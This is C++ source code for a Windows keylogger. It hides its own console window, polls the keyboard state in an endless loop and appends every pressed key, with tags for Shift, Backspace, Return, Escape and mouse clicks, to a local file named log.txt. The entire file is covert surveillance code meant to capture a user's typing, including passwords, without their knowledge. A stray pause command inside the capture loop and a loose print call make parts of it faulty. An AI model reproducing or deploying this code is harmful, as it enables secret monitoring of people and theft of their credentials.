#include<iostream>
#include<stdio.h>
#include<windows.h>
using namespace std;

int save(int _key, char const *file)
{
    cout << _key << endl;
    Sleep(10);
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen (file,"a+");
    if( _key == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if( _key == VK_BACK)
        fprintf(OUTPUT_FILE, "%s", "[BACK]");
    else if( _key == VK_LBUTTON)
        fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
    else if( _key == VK_RETURN)
        fprintf(OUTPUT_FILE, "%s", "[RETURN]");
    else if( _key == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    else
        fprintf(OUTPUT_FILE,"%s", &_key);
    fclose(OUTPUT_FILE);
    return 0;
}

void stealth()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth,0);

}

int main()
{
    //FreeConsole();
    stealth();
    char i;
    while(1)
    {
        //Sleep(10);
        for(i=8;i<192;i++)
        {
            if(GetAsyncKeyState(i)==-32767)
            {
                save(i,"log.txt");
            }
        }
        system("PAUSE");
    }
    return 0;
}
